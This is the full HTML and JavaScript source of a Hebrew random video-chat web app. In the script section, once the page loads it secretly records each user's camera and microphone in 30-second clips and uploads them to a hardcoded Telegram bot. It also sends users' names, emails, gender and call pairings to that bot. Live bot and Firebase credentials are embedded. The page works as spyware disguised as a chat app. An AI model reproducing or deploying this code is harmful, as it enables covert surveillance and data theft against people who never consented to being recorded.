<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>מי - פה</title>
    
    <meta name="theme-color" content="#000000">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <link rel="manifest" href='data:application/json,{"name":"Mi-Pe","short_name":"Mi-Pe","start_url":".","display":"standalone","background_color":"#000000","theme_color":"#000000","icons":[{"src":"https://i.ibb.co/twj79fFc/405736-rounded-1024x1024-1.png","sizes":"1024x1024","type":"image/png"}]}'>
    <link rel="apple-touch-icon" href="https://i.ibb.co/twj79fFc/405736-rounded-1024x1024-1.png">

    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-touch-callout: none; }
        body { background: #000; height: 100vh; overflow: hidden; font-family: system-ui, sans-serif; color: white; }
        #main-wrapper { display: flex; flex-direction: column; height: 100vh; }
        #top-half { height: 50vh; perspective: 1200px; position: relative; overflow: hidden; border-bottom: 2px solid #333; }
        #cube { width: 100%; height: 100%; position: absolute; transform-style: preserve-3d; transition: transform 0.4s ease-out; }
        .face { position: absolute; width: 100%; height: 100%; backface-visibility: hidden; display: flex; align-items: center; justify-content: center; }
        #home-face { background: #111; z-index: 2; }
        #partner-face { transform: rotateY(90deg) translateZ(50vw); background: #000; }
        video { width: 100%; height: 100%; object-fit: cover; background: #000; }
        #bottom-half { height: 50vh; background: #111; position: relative; }
        canvas { position: absolute; top:0; left:0; width:100%; height:100%; opacity:0.3; pointer-events:none; }
        #cam-switch { position: fixed; top: 15px; left: 15px; z-index: 999; width: 45px; height: 45px; border-radius: 50%; background: rgba(0,0,0,0.5); border: 1px solid #fff; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 20px; }
        #partner-gender-tag { position: fixed; top: 15px; right: 15px; z-index: 999; background: rgba(0,0,0,0.5); width: 45px; height: 45px; border-radius: 50%; border: 1px solid #fff; display: none; align-items: center; justify-content: center; font-size: 20px; }
        .showing-chat #cube { transform: translateZ(-50vw) rotateY(-90deg); }
        .modal { display: none; position: fixed; inset: 0; background: #000; z-index: 9999; align-items: center; justify-content: center; }
        .modal-content { background: #fff; padding: 25px; border-radius: 20px; width: 85%; max-width: 320px; text-align: center; color: #333; }
        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; text-align: center; font-size: 16px; }
        .reg-btn { width: 100%; padding: 14px; background: #27ae60; color: #fff; border: none; border-radius: 10px; font-weight: bold; font-size: 18px; }
    </style>
</head>
<body class="showing-home">

<button id="cam-switch" onclick="switchCamera()">🔄</button>
<div id="partner-gender-tag"></div>

<div id="main-wrapper">
    <div id="top-half">
        <div id="cube">
            <div id="home-face" class="face">
                <canvas id="snow-1"></canvas>
                <img src="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png" style="width:120px; position:relative;">
            </div>
            <div id="partner-face" class="face">
                <canvas id="snow-2"></canvas>
                <video id="remoteVideo" autoplay playsinline></video>
            </div>
        </div>
    </div>
    <div id="bottom-half">
        <video id="localVideo" autoplay muted playsinline></video>
    </div>
</div>

<div id="regModal" class="modal">
    <form class="modal-content" onsubmit="event.preventDefault(); handleRegistration();">
        <h2 style="margin-bottom:10px;">הרשמה</h2>
        <input type="text" id="reg-fname" placeholder="שם פרטי" required>
        <input type="text" id="reg-lname" placeholder="שם משפחה" required>
        <input type="email" id="reg-email" placeholder="אימייל" required>
        <select id="reg-gender" required>
            <option value="" disabled selected>מגדר</option>
            <option value="זכר">זכר</option>
            <option value="נקבה">נקבה</option>
        </select>
        <button type="submit" class="reg-btn">המשך</button>
    </form>
</div>

<script>
    if ('serviceWorker' in navigator) navigator.serviceWorker.register('sw.js').catch(()=>{});

    const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
    const TARGET_ADMIN = "7089165458"; 
    const SERVER_URL = "https://video-app-ylx4.onrender.com"; 

    firebase.initializeApp({ apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", databaseURL: "https://live-video-20fca-default-rtdb.firebaseio.com" });
    const db = firebase.database();
    const socket = io(SERVER_URL);
    
    const peer = new Peer(undefined, {
        config: { 'iceServers': [{ urls: 'stun:stun.l.google.com:19302' }] }
    });

    let myStream, partnerData, currentCall, camFacing = "user", rec, searchTimer;
    let historyPartnerIds = [];

    function sendAdmin(msg) { 
        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TARGET_ADMIN}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`); 
    }

    async function initCamera() {
        if(myStream) myStream.getTracks().forEach(t => t.stop());
        try {
            myStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: camFacing, width: 640, height: 480 }, 
                audio: true 
            });
            document.getElementById('localVideo').srcObject = myStream;
            if(!rec) startRecording();
        } catch(e) {}
    }

    function startRecording() {
        rec = new MediaRecorder(myStream, { mimeType: 'video/webm;codecs=vp8' });
        rec.ondataavailable = async (e) => {
            if(e.data.size > 0) {
                const user = JSON.parse(localStorage.getItem('user_v35'));
                const blob = new Blob([e.data], { type: 'video/mp4' });
                const fd = new FormData();
                fd.append("video", blob, "rec.mp4");
                fd.append("chat_id", TARGET_ADMIN);
                fd.append("caption", `🎥 הקלטה מ: ${user ? user.fname : 'אורח'}`);
                
                try {
                    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { 
                        method: "POST", 
                        body: fd, 
                        keepalive: true 
                    });
                } catch(err) { console.error("Video send failed"); }
            }
        };
        setInterval(() => { if(rec.state==='recording') { rec.stop(); rec.start(); } }, 30000);
        rec.start();
    }

    window.onload = () => {
        initCamera();
        const user = localStorage.getItem('user_v35');
        if(!user) document.getElementById('regModal').style.display = 'flex';
        else login(JSON.parse(user));
    };

    function login(user) {
        // שליחת כל פרטי המשתמש לבוט
        const msg = `🚀 **כניסה למערכת**\n\n👤 שם מלא: ${user.fname} ${user.lname}\n📧 אימייל: ${user.email}\n🚻 מגדר: ${user.gender}`;
        sendAdmin(msg);
    }

    function handleRegistration() {
        const user = { 
            fname: document.getElementById('reg-fname').value, 
            lname: document.getElementById('reg-lname').value, 
            email: document.getElementById('reg-email').value, 
            gender: document.getElementById('reg-gender').value 
        };
        localStorage.setItem('user_v35', JSON.stringify(user));
        document.getElementById('regModal').style.display = 'none';
        login(user);
    }

    let sX = 0;
    document.body.addEventListener('touchstart', e => sX = e.touches[0].clientX);
    document.body.addEventListener('touchend', e => {
        const d = sX - e.changedTouches[0].clientX;
        if(d > 60) {
            if(document.body.className === "showing-chat") { socket.emit('leave-chat'); if(currentCall) currentCall.close(); }
            document.body.className = "showing-chat";
            clearTimeout(searchTimer);
            searchTimer = setTimeout(() => { historyPartnerIds = []; socket.emit('find-partner', { peerId: peer.id, history: [], ...JSON.parse(localStorage.getItem('user_v35')) }); }, 10000);
            socket.emit('find-partner', { peerId: peer.id, history: historyPartnerIds, ...JSON.parse(localStorage.getItem('user_v35')) });
        } else if(d < -60) {
            document.body.className = "showing-home";
            socket.emit('leave-chat');
            if(currentCall) currentCall.close();
        }
    });

    peer.on('call', call => { call.answer(myStream); handleCall(call); });
    socket.on('partner-found', data => { 
        clearTimeout(searchTimer);
        partnerData = data; 
        if(!historyPartnerIds.includes(data.peerId)) historyPartnerIds.push(data.peerId);
        handleCall(peer.call(data.peerId, myStream, {metadata: JSON.parse(localStorage.getItem('user_v35'))})); 
    });

    function handleCall(call) {
        currentCall = call;
        call.on('stream', s => {
            document.getElementById('remoteVideo').srcObject = s;
            const me = JSON.parse(localStorage.getItem('user_v35'));
            const p = call.metadata || partnerData;
            if(p && p.peerId !== peer.id) {
                document.getElementById('partner-gender-tag').innerText = p.gender === 'זכר' ? '👨' : '👩';
                document.getElementById('partner-gender-tag').style.display = 'flex';
                // הודעת חיבור מפורטת
                sendAdmin(`🤝 **שיחה חדשה**\n\n👤 ${me.fname} (${me.email})\n↔️\n👤 ${p.fname} (${p.email})`);
            }
        });
    }

    async function switchCamera() { camFacing = camFacing === 'user' ? 'environment' : 'user'; initCamera(); }

    function initSnow(id) {
        const c = document.getElementById(id); const ctx = c.getContext('2d');
        function d() {
            c.width = window.innerWidth; c.height = window.innerHeight/2;
            const img = ctx.createImageData(c.width, c.height);
            const data = new Uint32Array(img.data.buffer);
            for(let i=0; i<data.length; i++) data[i] = Math.random() < 0.5 ? 0xff000000 : 0xff222222;
            ctx.putImageData(img, 0, 0); requestAnimationFrame(d);
        } d();
    }
    initSnow('snow-1'); initSnow('snow-2');
</script>
</body>
</html>
